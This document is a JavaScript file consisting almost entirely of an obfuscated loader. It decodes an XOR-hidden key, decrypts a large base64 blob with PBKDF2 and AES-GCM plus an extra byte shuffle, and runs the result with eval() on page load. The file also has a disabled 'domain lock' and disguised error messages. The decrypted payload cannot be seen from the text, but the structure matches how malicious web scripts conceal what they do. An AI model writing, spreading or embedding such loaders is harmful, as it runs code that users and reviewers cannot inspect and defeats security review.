(async function() {
    const _p = "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";
    const _authorized = "*";
    const _encK = "fGFqZ24=";
    
    // Domain Lock
    const currentHost = typeof window !== 'undefined' ? window.location.hostname : "";
    if (_authorized !== "*" && _authorized !== "") {
        const allowed = _authorized.split(",").map(d => d.trim());
        if (!allowed.some(d => currentHost.includes(d))) {
            console.error("DOMAIN NOT AUTHORIZED");
            return;
        }
    }

    try {
        const _raw = atob(_encK).split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 0x0F)).join('');
        const HardenedDec = (function(){
            const IT = 100000;
            const S_SZ = 16;
            const I_SZ = 12;
            return {
                async run(base64, pw) {
                    const data = new Uint8Array(atob(base64).split("").map(c => c.charCodeAt(0)));
                    const salt = data.slice(0, S_SZ);
                    const iv = data.slice(S_SZ, S_SZ+I_SZ);
                    const encData = data.slice(S_SZ+I_SZ);
                    const enc = new TextEncoder();
                    const bKey = await crypto.subtle.importKey("raw", enc.encode(pw), "PBKDF2", false, ["deriveKey"]);
                    const key = await crypto.subtle.deriveKey({name:"PBKDF2",salt:salt,iterations:IT,hash:"SHA-512"},bKey,{name:"AES-GCM",length:256},false,["decrypt"]);
                    const dec = await crypto.subtle.decrypt({name:"AES-GCM",iv:iv},key,encData);
                    let s = Array.from(enc.encode(pw)).reduce((a, b) => a + b, 0);
                    const unshuffled = new Uint8Array(dec);
                    for(let i=0; i<unshuffled.length; i++) {
                        s = (s * 16807) % 2147483647;
                        unshuffled[i] = unshuffled[i] ^ (s & 0xFF);
                    }
                    return new TextDecoder().decode(unshuffled);
                }
            };
        })();

        const result = await HardenedDec.run(_p, _raw);
        eval(result);
    } catch(e) {
        console.error("ENVIRONMENT CHECK FAILED");
    }
})();
